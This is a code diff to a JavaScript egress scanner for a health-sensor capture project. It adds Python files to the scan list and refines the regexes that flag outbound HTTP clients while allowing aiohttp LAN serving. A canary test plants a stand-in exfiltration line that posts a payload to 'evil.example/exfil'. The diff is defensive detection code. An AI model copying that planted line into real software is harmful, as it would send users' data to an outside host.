@@ -135,7 +135,9 @@ const ANALYSIS_PAGES = ['cgm-hrv-coupling-analysis.html','hrv-confound-analysis.
   'sigma-no-reference-analysis.html','qrs-equiv-analysis.html','qrs-yield-analysis.html',
   'cohort-harness.html','cohort-runner.html','cohort-regression.html','PAT Feasibility.html',
   'PpgDex Fusion Prototype.html','index.html'];
-const PY_FILES = ['capture-host/capture.py','capture-host/polar_pmd.py','capture-host/writers.py','capture-host/requirements.txt'];
+const PY_FILES = ['capture-host/capture.py','capture-host/polar_pmd.py','capture-host/writers.py',
+  'capture-host/bonding.py','capture-host/telemetry.py','capture-host/webmon.py','capture-host/viatom.py',
+  'capture-host/oxyii.py','capture-host/requirements.txt'];
 
 /* ── URL origin classifier (shared by the static scanner and the runtime trap string) ── */
 function isRemoteURL(u){
@@ -199,9 +201,13 @@ function scanText(text, label){
 
 /* ── Python static lens. Outbound HTTP client → FAIL; BLE / local file / LAN-serve → allowed.
    NOT authoritative (a browser can't run Python) — a text lens + a CI follow-up. ── */
-const PY_OUTBOUND = /\b(requests\.(?:get|post|put|patch|delete|request|Session)|urllib\.request|urlopen|urllib3|http\.client|httplib|httpx|aiohttp|smtplib|ftplib|boto3|google\.cloud|azure\.|paho\.mqtt|websockets?\.connect|socket\.create_connection)\b/;
-const PY_DEP_OUTBOUND = /^(requests|httpx|aiohttp|urllib3|boto3|google-cloud|azure-|paho-mqtt|websocket-client|websockets|pika|kafka-python)\b/i;
-const PY_SERVE = /\b(http\.server|socketserver|BaseHTTPRequestHandler|Flask|FastAPI|uvicorn|gunicorn|app\.run)\b/;
+// aiohttp is DUAL-USE (client + LAN server). We flag CLIENT usage (ClientSession / aiohttp.request) as
+// outbound, but NOT the bare import or `aiohttp.web` — the capture-host serves its monitor page over
+// aiohttp.web on the LAN (webmon.py), which is the "LAN-serve → allowed" case this lens permits. The
+// dep-name list drops aiohttp for the same reason; a real outbound aiohttp call is still caught by usage.
+const PY_OUTBOUND = /\b(requests\.(?:get|post|put|patch|delete|request|Session)|urllib\.request|urlopen|urllib3|http\.client|httplib|httpx|ClientSession|aiohttp\.request|smtplib|ftplib|boto3|google\.cloud|azure\.|paho\.mqtt|websockets?\.connect|socket\.create_connection)\b/;
+const PY_DEP_OUTBOUND = /^(requests|httpx|urllib3|boto3|google-cloud|azure-|paho-mqtt|websocket-client|websockets|pika|kafka-python)\b/i;
+const PY_SERVE = /\b(http\.server|socketserver|BaseHTTPRequestHandler|aiohttp\.web|aiohttp import web|Flask|FastAPI|uvicorn|gunicorn|app\.run)\b/;
 const PY_BLE   = /\b(bleak|BleakClient|bluetooth|pydbus|dbus)\b/;
 
 function scanPython(text, label){
@@ -468,7 +474,7 @@ function localScriptSrcs(html){
   const PY_PLANTED = 'import requests\nrequests.post("https://evil.example/exfil", json=payload)\nurllib.request.urlopen("http://evil.example")';
   const pyScan = scanPython(PY_PLANTED, 'canary/planted.py');
   canRow('python · planted requests.post', 'flag an outbound HTTP client call', pyScan.egress.length>=1, pyScan.egress.length+' flagged');
-  const PY_BENIGN = 'from bleak import BleakClient\nimport http.server\nwr.write(row)';
+  const PY_BENIGN = 'from bleak import BleakClient\nimport http.server\nfrom aiohttp import web\napp = web.Application()\nwr.write(row)';
   const pyBenign = scanPython(PY_BENIGN, 'canary/benign.py');
   canRow('python · BLE/serve not flagged', 'bleak + http.server = local, 0 egress', pyBenign.egress.length===0, pyBenign.egress.length+' false-positive(s)');
 
